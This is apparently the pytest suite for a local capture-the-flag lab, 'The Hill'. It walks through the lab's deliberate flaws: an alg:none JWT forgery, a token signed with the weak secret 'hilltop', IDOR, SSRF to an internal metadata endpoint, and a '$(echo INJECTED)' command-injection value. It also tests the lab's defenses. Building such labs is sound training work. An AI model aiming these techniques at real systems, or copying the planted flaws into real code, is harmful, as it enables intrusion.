"""The Hill CTF — four guarded perimeters, rotating vault token.

Stage flaws, decoys, canary trips, defense levers, and the standard lab
conventions (boot/probe/port) — all local-only (127.0.0.1).
"""

import json
import subprocess
import sys
import time
from pathlib import Path

import pytest

LAB = Path(__file__).resolve().parents[2] / "lab" / "hill_ctf"
sys.path.insert(0, str(LAB))

PUBLIC = 5990
INTERNAL = 5911  # design port (tests read it directly)


@pytest.fixture(scope="module")
def hill(tmp_path_factory):
    """Boot the lab (public on 5990, internal on 5911) once for the module."""
    tmp = tmp_path_factory.mktemp("hill")
    env = {
        **__import__("os").environ,
        "PORT": str(PUBLIC),
        "HILL_EVENTS_LOG": str(tmp / "events.jsonl"),
        "HILL_TRAFFIC_LOG": str(tmp / "traffic.jsonl"),
    }
    proc = subprocess.Popen(
        [sys.executable, str(LAB / "app.py")],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
    )
    import urllib.request

    for _ in range(30):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{PUBLIC}/health", timeout=1)
            break
        except Exception:
            time.sleep(0.3)
    yield {"proc": proc, "tmp": tmp, "events": tmp / "events.jsonl", "traffic": tmp / "traffic.jsonl"}
    proc.kill()


def _req(method, url, **kw):
    import urllib.error
    import urllib.request

    r = urllib.request.Request(url, method=method, **kw)
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, json.loads(resp.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode() or "{}")


def _events(hill, etype):
    if not hill["events"].exists():
        return []
    out = []
    for ln in hill["events"].read_text().splitlines():
        try:
            e = json.loads(ln)
            if e.get("type") == etype:
                out.append(e)
        except ValueError:
            continue
    return out


class TestStage1Perimeter:
    def test_decoy_admin_always_fails(self, hill):
        code, body = _req("POST", f"http://127.0.0.1:{PUBLIC}/admin", data=b"u=a&p=b")
        assert code == 401 and "invalid" in body["error"]

    def test_decoy_token_validates_false(self, hill):
        import urllib.request

        with urllib.request.urlopen(f"http://127.0.0.1:{PUBLIC}/decoy-token", timeout=3) as r:
            tok = json.loads(r.read())["token"]
        code, body = _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/token/validate",
            data=json.dumps({"token": tok}).encode(),
            headers={"Content-Type": "application/json"},
        )
        assert body["valid"] is False

    def test_robots_and_security_misdirect(self, hill):
        import urllib.request

        robots = urllib.request.urlopen(f"http://127.0.0.1:{PUBLIC}/robots.txt", timeout=3).read().decode()
        assert "/admin" in robots and "/hill/login" in robots  # real entry leaked as noise

    def test_manager_is_ghost(self, hill):
        code, _ = _req("GET", f"http://127.0.0.1:{PUBLIC}/manager")
        assert code == 404


class TestStage2Foothold:
    def _login(self, hill, user="cartographer", pw="3l3vation!"):
        return _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/login",
            data=json.dumps({"user": user, "password": pw}).encode(),
            headers={"Content-Type": "application/json"},
        )

    def test_login_and_jwt(self, hill):
        code, body = self._login(hill)
        assert code == 200 and body["token"].count(".") == 2

    def test_bad_password_emits_auth_fail(self, hill):
        code, _ = self._login(hill, pw="wrong")
        assert code == 401
        assert _events(hill, "auth_fail")

    def test_alg_none_forged_token_accepted(self, hill):
        """The two-step flaw's step 2: unsigned admin token passes decode."""
        import base64

        def b64(d):
            return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")

        forged = (
            b64({"alg": "none", "typ": "JWT"})
            + "."
            + b64({"sub": "gatekeeper", "role": "admin", "exp": int(time.time()) + 600})
            + "."
        )
        code, body = _req(
            "GET", f"http://127.0.0.1:{PUBLIC}/hill/api/docs/103", headers={"Authorization": f"Bearer {forged}"}
        )
        assert code == 200 and "rotation call" in body["body"]

    def test_idor_reads_other_users_docs(self, hill):
        _, body = self._login(hill)
        tok = body["token"]
        code, doc = _req(
            "GET", f"http://127.0.0.1:{PUBLIC}/hill/api/docs/102", headers={"Authorization": f"Bearer {tok}"}
        )
        assert code == 200 and "HILLKEY-PARTA" in doc["body"]  # fragment A via IDOR
        assert _events(hill, "idor_access")

    def test_weak_secret_signature_forgery(self, hill):
        """Step 1: secret 'hilltop' lets red mint a validly-signed token."""
        import base64
        import hashlib
        import hmac as hm

        def b64j(d):
            return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=")

        def b64b(b):
            return base64.urlsafe_b64encode(b).rstrip(b"=")

        header, payload = (
            {"alg": "HS256", "typ": "JWT"},
            {"sub": "wirewatcher", "role": "comms", "exp": int(time.time()) + 600},
        )
        si = b64j(header) + b"." + b64j(payload)
        sig = b64b(hm.new(b"hilltop", si, hashlib.sha256).digest())
        tok = (si + b"." + sig).decode()
        code, _ = _req(
            "GET", f"http://127.0.0.1:{PUBLIC}/hill/api/docs/104", headers={"Authorization": f"Bearer {tok}"}
        )
        assert code == 200


class TestStage3Pivot:
    def _temp(self, hill):
        _, body = _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/api/webhook",
            data=json.dumps({"url": f"http://127.0.0.1:{INTERNAL}/metadata?role=guard"}).encode(),
            headers={"Content-Type": "application/json"},
        )
        return json.loads(body["body"])["TempToken"]

    def test_ssrf_reaches_metadata(self, hill):
        temp = self._temp(hill)
        assert temp.startswith("hill-temp-")
        assert _events(hill, "ssrf_attempt") and _events(hill, "metadata_access")

    def test_internal_api_needs_temp_token(self, hill):
        code, _ = _req("GET", f"http://127.0.0.1:{INTERNAL}/api/internal")
        assert code == 401

    def test_fragment_b_via_internal_api(self, hill):
        temp = self._temp(hill)
        code, body = _req("GET", f"http://127.0.0.1:{INTERNAL}/api/internal", headers={"X-Hill-Token": temp})
        assert code == 200 and "HILLKEY-PARTB" in body["key_fragment_b"]

    def test_canary_at_metadata_trips(self, hill):
        _, body = _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/api/webhook",
            data=json.dumps({"url": f"http://127.0.0.1:{INTERNAL}/metadata?role=x&key=AKIAHILLCANARY01"}).encode(),
            headers={"Content-Type": "application/json"},
        )
        inner = json.loads(body["body"])
        assert inner["AccessKeyId"].startswith("ASIAHILLDECOY")  # deceived, not real
        assert _events(hill, "canary_metadata")

    def test_external_ssrf_refused(self, hill):
        code, body = _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/api/webhook",
            data=json.dumps({"url": "http://example.com/"}).encode(),
            headers={"Content-Type": "application/json"},
        )
        assert code == 400 and "internal" in body["error"]


class TestStage4Vault:
    def _temp(self, hill):
        _, body = _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/api/webhook",
            data=json.dumps({"url": f"http://127.0.0.1:{INTERNAL}/metadata?role=guard"}).encode(),
            headers={"Content-Type": "application/json"},
        )
        return json.loads(body["body"])["TempToken"]

    def test_blob_and_decryptor_chain(self, hill):
        temp = self._temp(hill)
        _, blob = _req("GET", f"http://127.0.0.1:{INTERNAL}/vault/blob", headers={"X-Hill-Token": temp})
        assert blob["blob"].startswith("HILLVAULT1:")  # red must reassemble FLAG{inner}
        _, dec = _req(
            "POST",
            f"http://127.0.0.1:{INTERNAL}/vault/decrypt",
            data="fa=HILLKEY-PARTA-7f3a9c&fb=HILLKEY-PARTB-2d8e41".encode(),
            headers={"X-Hill-Token": temp, "Content-Type": "application/x-www-form-urlencoded"},
        )
        assert dec["ok"] and "HILLVAULT1:" in dec["output"]

    def test_wrong_fragments_refused(self, hill):
        temp = self._temp(hill)
        _, dec = _req(
            "POST", f"http://127.0.0.1:{INTERNAL}/vault/decrypt", data=b"fa=AAA&fb=BBB", headers={"X-Hill-Token": temp}
        )
        assert dec["ok"] is False

    def test_force_rotate_invalidates(self, hill):
        _, blob = _req("GET", f"http://127.0.0.1:{INTERNAL}/vault/blob", headers={"X-Hill-Token": self._temp(hill)})
        stolen_inner = blob["blob"].removeprefix("HILLVAULT1:")
        _req("POST", f"http://127.0.0.1:{PUBLIC}/hill/admin/rotate")  # local-only lever
        _, v = _req(
            "POST",
            f"http://127.0.0.1:{PUBLIC}/hill/token/validate",
            data=json.dumps({"token": f"FLAG{{{stolen_inner}}}"}).encode(),
            headers={"Content-Type": "application/json"},
        )
        assert v["valid"] is False

    def test_command_injection_escapes_echo(self, hill):
        temp = self._temp(hill)
        payload = "HILLKEY-PARTA-$(echo INJECTED)"
        _, dec = _req(
            "POST",
            f"http://127.0.0.1:{INTERNAL}/vault/decrypt",
            data=f"fa={payload}&fb=HILLKEY-PARTB-2d8e41".encode(),
            headers={"X-Hill-Token": temp},
        )
        assert "INJECTED" in dec["output"]  # injection escapes the echo


class TestDefenseLevers:
    def test_login_rate_limit(self, hill, tmp_path):
        df = LAB / "hill_defense.json"
        had = df.exists()
        old = df.read_text() if had else None
        try:
            df.write_text(json.dumps({"login_rate_limit": 2, "login_rate_window": 60}))
            import importlib

            import defenses

            importlib.reload(defenses)  # the running app reads per-request; fresh module for unit path
            codes = []
            for i in range(4):
                code, _ = _req(
                    "POST",
                    f"http://127.0.0.1:{PUBLIC}/hill/login",
                    data=json.dumps({"user": "x", "password": "bad"}).encode(),
                    headers={"Content-Type": "application/json"},
                )
                codes.append(code)
            assert 429 in codes  # lever bites (module-level counter shared per process)
        finally:
            if had:
                df.write_text(old)
            else:
                df.unlink(missing_ok=True)

    def test_ssrf_blocklist(self, hill):
        df = LAB / "hill_defense.json"
        had = df.exists()
        old = df.read_text() if had else None
        try:
            df.write_text(json.dumps({"ssrf_blocklist": ["5911/metadata"]}))
            code, body = _req(
                "POST",
                f"http://127.0.0.1:{PUBLIC}/hill/api/webhook",
                data=json.dumps({"url": f"http://127.0.0.1:{INTERNAL}/metadata?role=g"}).encode(),
                headers={"Content-Type": "application/json"},
            )
            assert code == 403 and "refused" in body["error"]
        finally:
            if had:
                df.write_text(old)
            else:
                df.unlink(missing_ok=True)


class TestConventions:
    def test_port_literal_discoverable(self):
        src = (LAB / "app.py").read_text()
        import re

        # the discovery convention: port=NNNN anywhere OR [Pp]ort NNNN in the docstring
        assert re.search(r"port\s*=\s*(\d{4,5})", src) or re.search(r"[Pp]ort[:\s]+(\d{4,5})", src[:4000])

    def test_events_file_grew(self, hill):
        assert hill["events"].exists() and hill["events"].read_text().count("\n") >= 5

    def test_traffic_log_flows(self, hill, tmp_path_factory):
        # the standard blue feed convention (HILL_TRAFFIC_LOG env pointed at tmp)
        tl = hill["tmp"] / "traffic.jsonl"
        assert tl.exists() and "hill/login" in tl.read_text()

    def test_unit_rotation(self, tmp_path, monkeypatch):
        import events as ev

        monkeypatch.setattr(ev, "EVENTS_PATH", tmp_path / "e.jsonl")
        import vault as v

        v._state.update({"token": "", "issued_at": 0.0, "generation": 0})
        t1 = v.current_token()
        v._state["issued_at"] -= v.ROTATE_INTERVAL + 1  # age it
        t2 = v.current_token()
        assert t1 != t2  # scheduled rotation
        r = v.force_rotate("test")
        t3 = v.current_token()
        assert t3 != t2 and r["generation"] >= 3
